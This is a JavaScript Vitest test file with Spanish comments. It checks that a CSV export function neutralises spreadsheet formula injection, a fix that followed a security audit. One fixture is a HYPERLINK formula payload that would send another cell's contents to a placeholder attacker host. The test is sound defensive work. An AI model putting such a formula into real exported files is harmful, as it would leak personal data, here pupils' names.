import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { exportToCSV } from '../utils';

// Regresión de seguridad (auditoría 2026-06-06): exportToCSV debe neutralizar la
// inyección de fórmulas (CSV/formula injection). Las celdas incluyen nombres reales
// de menores (texto libre del profesor); una celda que empieza por = + - @ TAB o CR
// la interpretan Excel/Sheets/LibreOffice como fórmula (HYPERLINK/WEBSERVICE/DDE) al
// abrir el CSV, permitiendo exfiltrar datos de otras celdas.

describe('exportToCSV — neutralización de inyección de fórmulas', () => {
  let capturedBlob;

  beforeEach(() => {
    capturedBlob = null;
    // jsdom no implementa createObjectURL; lo mockeamos para capturar el Blob generado.
    globalThis.URL.createObjectURL = vi.fn(blob => {
      capturedBlob = blob;
      return 'blob:mock';
    });
    globalThis.URL.revokeObjectURL = vi.fn();
    // Evitar la navegación real que dispararía <a>.click().
    vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});
  });

  afterEach(() => vi.restoreAllMocks());

  const readCsv = async () => (capturedBlob ? await capturedBlob.text() : '');

  it('prefija con apóstrofo las celdas que empiezan por = + - @', async () => {
    const data = [
      { name: '=HYPERLINK("http://evil/?d="&A1,"x")', note: '+1+1' },
      { name: '-2+3', note: '@SUM(A1)' },
      { name: 'Sofía García', note: 'normal' }
    ];

    exportToCSV(data, 'test', [
      { key: 'name', label: 'Nombre' },
      { key: 'note', label: 'Nota' }
    ]);

    const csv = await readCsv();
    expect(csv).toContain('"\'=HYPERLINK');
    expect(csv).toContain('"\'+1+1"');
    expect(csv).toContain('"\'-2+3"');
    expect(csv).toContain('"\'@SUM(A1)"');
    // Un valor seguro NO se altera.
    expect(csv).toContain('"Sofía García"');
    expect(csv).not.toContain("'Sofía");
  });

  it('mantiene el escapado RFC-4180 de comillas dobles', async () => {
    exportToCSV([{ v: 'dice "hola"' }], 'q', [{ key: 'v', label: 'V' }]);
    const csv = await readCsv();
    expect(csv).toContain('"dice ""hola"""');
  });
});
